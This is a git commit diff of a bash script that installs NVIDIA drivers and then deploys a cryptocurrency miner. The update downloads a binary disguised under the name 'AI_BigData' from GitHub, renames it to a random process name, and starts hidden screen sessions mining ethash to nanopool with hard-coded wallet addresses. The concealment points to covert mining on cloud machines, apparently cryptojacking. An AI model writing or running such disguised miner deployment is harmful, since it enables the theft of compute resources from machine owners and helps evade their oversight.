af83de782b2e4591f058be5f93e4899d72c12f05
ts6aud5vkg <44915776+ts6aud5vkg@users.noreply.github.com>
2021-10-09 17:10:28 +0700

    Update ethxuxu.sh

--- ethxuxu.sh
+++ ethxuxu.sh
@@ -1,21 +1,19 @@
 #!/bin/bash
-sudo apt-get update
+apt-get update
+apt-get install -y git wget screen
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-apt-get install -y git wget screen
 wget https://us.download.nvidia.com/tesla/460.73.01/NVIDIA-Linux-x86_64-460.73.01.run
 sudo chmod +x NVIDIA-Linux-x86_64-460.73.01.run
 ./NVIDIA-Linux-x86_64-460.73.01.run
+rm -r /usr/share/work/$azure
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/xuxu
-wget https://github.com/ts6aud5vkg/xuxu/releases/download/xuxu/xuxu.tar.gz
-mv xuxu.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf xuxu.tar.gz
-rm -rf xuxu.tar.gz && cd xuxu
-mv nanominer $azure -n
+wget https://github.com/ts6aud5vkg/gpuissa/releases/download/grin/AI_BigData
+mv AI_BigData /usr/share/work/ && cd  /usr/share/work/ && chmod 777 AI_BigData
+mv AI_BigData $azure -n
 cp $azure "$cpuname"
-rm -f  nanominer
+rm -f  AI_BigData
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" eth01.ini
-screen -d -m ./"${cpuname}" eth02.ini
+screen -d -m ./"${cpuname}" --algo ethash --server eth-us-west1.nanopool.org:9433 --user 0xfa5791101bf9c5f5a4753c034b77de0e4d1f79ca.orc --ssl 1
+screen -d -m ./"${cpuname}" --algo ethash --server eth-us-east1.nanopool.org:9433 --user 0x09d3159bb9d719f27b5578551d959de6e7271738.xuxu --ssl 1
